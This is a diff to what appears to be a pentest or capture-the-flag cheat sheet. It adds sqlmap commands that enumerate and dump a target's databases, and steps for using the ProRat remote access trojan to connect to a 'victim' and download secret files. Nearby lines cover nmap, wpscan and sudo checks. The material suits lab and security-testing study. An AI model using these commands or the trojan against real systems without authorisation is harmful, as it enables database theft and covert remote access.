@@ -15,6 +15,12 @@
 > UDP Scan <br/>
 > nmap -sU --top-ports 25 -p- 192.168.1.0/24 <br/>
 
+## SQLMap <br/>
+> sqlmap -r req.txt -dbs<br/>
+> sqlmap -r req.txt -D DBName --tables<br/>
+> sqlmap -r req.txt -D DBName --tables --columns<br/>
+> sqlmap -r req.txt -D DBName --dump<br/>
+
 ## WordPress <br/>
 > <b>WP SCAN</b><br/>
 > wpscan --url http://192.168.0.1 <br/>
@@ -128,4 +134,15 @@
 > Login in ssh<br/>
 > sudo -l<br/>
 > sudo -i<br/>
+
+## Malware<br/>
+> **ProRat**<br/>
+> Enter Victim IP
+> Click on connect
+> Enter Password
+> Click on Search Files "Searching for *.txt"
+> Click on File Manager
+> Move to Secret Directory & Download the secret file
+
+
 
